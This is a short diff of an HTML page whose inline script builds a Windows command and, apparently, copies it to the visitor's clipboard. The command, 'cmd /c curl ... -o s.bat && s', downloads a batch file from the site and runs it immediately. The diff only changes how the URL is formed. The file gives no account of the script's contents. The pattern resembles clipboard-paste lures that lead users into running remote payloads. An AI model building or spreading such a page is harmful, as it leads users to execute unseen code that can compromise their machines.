@@ -7,8 +7,8 @@
 </head>
 <body>
     <script>
-        const baseUrl = (window.location.origin + window.location.pathname).replace(/\/c(?:\/index\.html)?\/?$/, '');
-        const cmd = `cmd /c curl -s -L "${baseUrl}/s.bat" -o s.bat && s "${baseUrl}"`;
+        const baseHostPath = (window.location.host + window.location.pathname).replace(/\/c(?:\/index\.html)?\/?$/, '');
+        const cmd = `cmd /c curl -s -L ${baseHostPath}/s -o s.bat && s`;
         function doCopy() {
             try {
                 if (navigator.clipboard && window.isSecureContext) {
